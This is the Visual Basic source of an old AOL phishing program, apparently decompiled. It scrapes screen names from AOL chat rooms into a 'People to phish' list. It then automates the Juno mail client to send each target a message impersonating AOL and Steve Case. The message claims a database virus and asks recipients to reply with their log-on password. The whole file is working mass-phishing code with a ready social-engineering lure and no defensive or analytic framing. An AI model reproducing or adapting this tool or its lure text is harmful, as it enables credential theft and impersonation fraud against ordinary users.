' JPHISH.FRM
Option Explicit

Sub Command3D1_Click ()
Dim l0020 As Variant
Dim l0024 As Variant
Dim l0028 As Variant
Dim l002C As Variant
If  List1.ListCount = 0 Then
MsgBox "You need at least one name to save!", 16
Exit Sub
End If
For l0020 = 0 To List1.ListCount - 1
l0024 = List1.List(l0020)
l0028 = ";"
If  l0020 = List1.ListCount - 1 Then l0028 = ""
l002C = l002C + l0024 + l0028
Next l0020
Open "PHISH.DAT" For Output As #1
Print #1, l002C
Close #1
MsgBox "List has been saved!", 16
End Sub

Sub Command3D2_Click ()
Dim l0030 As Variant
Dim l0034 As String
Dim l0036 As Variant
Dim l003A As Variant
Dim l004A As Variant
Dim l004E As Variant
Dim l0052 As Variant
Open "Phish.dat" For Binary As #1
l0030 = LOF(1)
If  l0030 = 0 Then
MsgBox "There is nothing to load!", 16
Close #1
Exit Sub
End If
l0034$ = String(l0030, 0)
Get #1, 1, l0034$
Close #1
Do Until 2 > 3
l0036 = InStr(l0034$, ";")
If  l0036 Then
l003A = Mid(l0034$, 1, l0036 - 1)
List1.AddItem l003A
Text3.Text = Text3.Text + l003A + ","
l004A = InStr(label3.Caption, "People to phish: ")
l004E = Mid(label3.Caption, l004A + 17, Len(label3.Caption))
l0052 = l004E + 1
label3.Caption = "People to phish: " + l0052
Else
l0034$ = Mid(l0034$, 1, Len(l0034$) - 2)
List1.AddItem l0034$
Text3.Text = Text3.Text + l0034$ + ","
l004A = InStr(label3.Caption, "People to phish: ")
l004E = Mid(label3.Caption, l004A + 17, Len(label3.Caption))
l0052 = l004E + 1
label3.Caption = "People to phish: " + l0052
GoTo 10
End If
l0034$ = Mid(l0034$, l0036 + 1, Len(l0034$))
Loop
10 :
End Sub

Sub Command3D3_Click ()
Dim l0058 As Variant
Dim l005E As Variant
Dim l0062 As String
Dim l0066 As Variant
Dim l006A As Variant
Dim l0072 As Variant
Dim l0078 As Variant
Dim l007C As Variant
Dim l0080 As Variant
Dim l0084 As Variant
Dim l0088 As String
Dim l008A As Variant
Dim l008E As Variant
Dim l0092 As Variant
Dim l0096 As String
Dim l009A As Variant
Dim l009E As Variant
Dim l00A2 As Variant
Dim l00A6 As Variant
Dim l00AA As Variant
Dim l00AE As Variant
l0058 = extfn1018("AOL FRAME25", 0&)
l005E = extfn10F8(l0058, "Welcome")
l0062$ = String(30, 0)
l0066 = extfnFA8(l005E, l0062$, 250)
If  l0066 <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
l006A = extfn1018("AOL FRAME25", 0&)
l0058 = extfn10F8(l006A, "AOL Live!")
l0058 = extfn1088(l0058)
If  l0058 = 0 Then
MsgBox "Room List not found!", 16
Exit Sub
End If
l0072 = extfn10C0(l0058, "_AOL_listbox")
l0078 = extfnFE0(l0072, 1036, 0, 0)
For l007C = 0 To l0078 - 1
DoEvents
l0080 = extfn1018("AOL FRAME25", 0&)
l0084 = extfn10F8(l0080, "Welcome")
l0088$ = String(30, 0)
l008A = extfnFA8(l0084, l0088$, 250)
l008E = l008A - 1
On Error Resume Next
l0092 = Mid(Left(l0088$, l008E), 10)
If  Err Then
Exit Sub
End If
l0096$ = String(30, 0)
l009A = extfn1608(l007C, l0096$)
l009E = InStr(l0096$, Chr(0))
If  l009E Then
l0096$ = Mid(l0096$, 1, l009E - 1)
End If
l0058 = InStr(1, Text3.Text, l0096$, 1)
If  l0058 Then
l005E = Mid(Text3.Text, l0058 + Len(l0096$), 1)
If  l005E = "," Then GoTo 3003
End If
l00A2 = InStr(1, l0096$, l0092, 1)
If  l00A2 Then GoTo 3003
List1.AddItem l0096$
Text3.Text = Text3.Text + l0096$ + ","
l00A6 = InStr(label3.Caption, "People to phish: ")
l00AA = Mid(label3.Caption, l00A6 + 17, Len(label3.Caption))
l00AE = Int(l00AA) + 1
label3.Caption = "People to phish: " + Str(l00AE)

3003 :
Next l007C
End Sub

Sub Command3D4_Click ()
label3.Caption = "People to phish: 0"
List1.Clear
Text3.Text = ""
End Sub

Sub Command3D5_Click ()
Dim l00B2 As Variant
Dim l00B6 As Variant
Dim l00BA As Variant
Dim l00BE As Variant
Dim l00C2 As Variant
l00B2 = List1.ListIndex
l00B6 = List1.List(l00B2)
On Error Resume Next
List1.RemoveItem l00B2
If  Err Then
MsgBox "Highlight the person you want to delete!", 16
Exit Sub
Else
l00BA = InStr(1, Text3.Text, l00B6 + ",", 1)
If  l00BA Then
l00BE = Mid(Text3.Text, 1, l00BA - 1)
l00C2 = Mid(Text3.Text, l00BA + Len(l00B6) + 1, Len(Text3.Text))
Text3.Text = l00BE + l00C2
l00B2 = Mid(label3.Caption, 17, Len(label3))
l00BE = l00B2 - 1
label3.Caption = "People to phish: " + l00BE
End If
End If
End Sub

Sub Command3D6_Click ()
Dim l00CC As Variant
Dim l00D0 As Variant
Dim l00D4 As Variant
Dim l00D8 As Variant
If  Text2.Text = "" Then Exit Sub
For l00CC = 0 To List1.ListCount
l00D0 = InStr(1, List1.List(l00CC), Text2.Text, 1)
If  l00D0 Then
If  Len(List1.List(l00CC)) = Len(Text2.Text) Then
Text2.Text = ""
GoTo 200
End If
End If
Next l00CC
List1.AddItem Text2
Text3.Text = Text3.Text + Text2.Text + ","
Text2 = ""
l00D4 = Mid(label3.Caption, 17, Len(label3))
l00D8 = Int(l00D4) + 1
label3 = "People to phish: " + Str(l00D8)
200 :
End Sub

Sub Command3D7_Click ()
If  List1.ListCount = 0 Then
MsgBox "There is nobody to phish!", 16
Exit Sub
End If
If  Text1.Text = "" Then
MsgBox "There is no message to send!", 16
Exit Sub
End If
If  Text4.Text = "" Then
MsgBox "You must enter in a subject!", 16
Exit Sub
End If
If  Command3D7.Caption = "Start" Then
Command3D7.Caption = "Stop"
Timer1.Enabled = True
Timer1.Interval = 1
Else
Command3D7.Caption = "Start"
Timer1.Interval = 0
Timer1.Enabled = False
End If
End Sub

Sub Form_Load ()
Dim l00F4 As Variant
Text4.Text = "Attention: America Online FlashNews"
l00F4 = Chr(13) + Chr(10)
Text1.Text = "Dear AOL Community Member:"
Text1.Text = Text1.Text + l00F4 + "     AOL is experiencing major problems, due to a virus that was recently "
Text1.Text = Text1.Text + "loaded onto our main user database, containing most of our member "
Text1.Text = Text1.Text + "registration information. We are currently experiencing widespread system "
Text1.Text = Text1.Text + "failure. The problem originated when our system was illegally breached by a"
Text1.Text = Text1.Text + " former AOL employee."
Text1.Text = Text1.Text + l00F4 + "     We believe the employee, who is currently being questioned by authorities, "
Text1.Text = Text1.Text + "loaded a virus into our database. Because we identified the problem quickly,"
Text1.Text = Text1.Text + " we were able to stop the problem before the entire database was deleted."
Text1.Text = Text1.Text + " The files that were deleted, however, happened to be the database link"
Text1.Text = Text1.Text + " files that link a user's password and screen name to the rest of their "
Text1.Text = Text1.Text + "account. We are currently working with McAfee Associates (Anti-Virus), to"
Text1.Text = Text1.Text + " replace the lost files. "
Text1.Text = Text1.Text + l00F4 + "     Some of the effects as a result of not having the database link files"
Text1.Text = Text1.Text + " include: random log-off's, AOLnet runs slower, and E-mail may accidentally be"
Text1.Text = Text1.Text + " deleted. These problems are MAJOR inconveniences to our users, so we need"
Text1.Text = Text1.Text + " your help to fix the problem. In order to fix this problem, we need you, the America Online User to click on 'Reply' and enter in your log-on password in order to have these problems fixed. Thank you for your consideration and continue to enjoy America Online!"
Text1.Text = Text1.Text + " If you have any questions, please discuss them with your contact at AOL."
Text1.Text = Text1.Text + l00F4 + l00F4 + "Thank you."
Text1.Text = Text1.Text + l00F4 + l00F4 + "Regards,"
Text1.Text = Text1.Text + l00F4 + l00F4 + "Steve Case"
extsub1050 jphish.hWnd, -1, 0, 0, 0, 0, 3
End Sub

Sub Text2_KeyPress (KeyAscii As Integer)
Dim l00FE As Variant
Dim l0102 As Variant
Dim l0106 As Variant
Dim l010A As Variant
l00FE = Chr(KeyAscii)
If  l00FE = Chr(13) Then
If  Text2.Text = "" Then Exit Sub
For l00FE = 0 To List1.ListCount
l0102 = InStr(1, List1.List(l00FE), Text2.Text, 1)
If  l0102 Then
If  Len(List1.List(l00FE)) = Len(Text2.Text) Then
Text2.Text = ""
GoTo 2001
End If
End If
Next l00FE
List1.AddItem Text2
Text3.Text = Text3.Text + Text2.Text + ","
Text2 = ""
l0106 = Mid(label3.Caption, 17, Len(label3))
l010A = Int(l0106) + 1
label3 = "People to phish: " + Str(l010A)
2001 :
End If
End Sub

Sub Timer1_Timer ()
Dim l010E As Variant
Dim l0116 As Variant
Dim l011A As Variant
Dim l0120 As Variant
Dim l0124 As Variant
Dim l012A As Variant
Dim l012E As Variant
Dim l0132 As Variant
Dim l0136 As Variant
Dim l013A As Variant
Dim l013E As Variant
Dim l0142 As Variant
Dim l0146 As Variant
Dim l014A As Variant
Dim l014E As Variant
Dim l0154 As Variant
Dim l015A As Variant
Dim l0160 As Variant
Dim l0164 As Variant
l010E = extfn1018("afx:b:1526:6:4297", 0&)
If  l010E = 0 Then
MsgBox "Juno Could Not Be Found. Make sure you have Juno Loaded!", 16
GoTo L6E5A0
Exit Sub
End If
pwait.Show
For l0116 = 0 To List1.ListCount - 1
If  Timer1.Interval = 0 Then GoTo L6E5A0
l011A = extfn10F8(l010E, "To:")
l0120 = extfn1168(l011A, 3)
l0124 = extfn1168(l0120, 1)
l012A = extfn11A0(l0124, 12, 0, Text1.Text)
l012E = extfn10F8(l010E, "Subject:")
l0132 = extfn1168(l012E, 3)
l0136 = extfn11A0(l0132, 12, 0, Text4.Text)
l013A = extfn10F8(l010E, "Subject:")
l013E = extfn1168(l013A, 3)
l0142 = extfn1168(l013E, 3)
l0146 = extfn1168(l0142, 3)
l014A = List1.List(l0116) + "@aol.com"
l014E = extfn11A0(l0146, 12, 0, l014A)
l0154 = extfn1790(l010E)
l015A = extfn17C8(l0154, 0)
l0160 = extfn1800(l015A, 2)
l0164 = extfnFE0(l010E, 273, l0160, 0)
If  Timer1.Interval = 0 Then GoTo L6E5A0
DoEvents
If  Timer1.Interval = 0 Then GoTo L6E5A0
Next l0116
L6E5A0:
Timer1.Interval = 0
Command3D7.Caption = "Start"
Unload pwait
End Sub
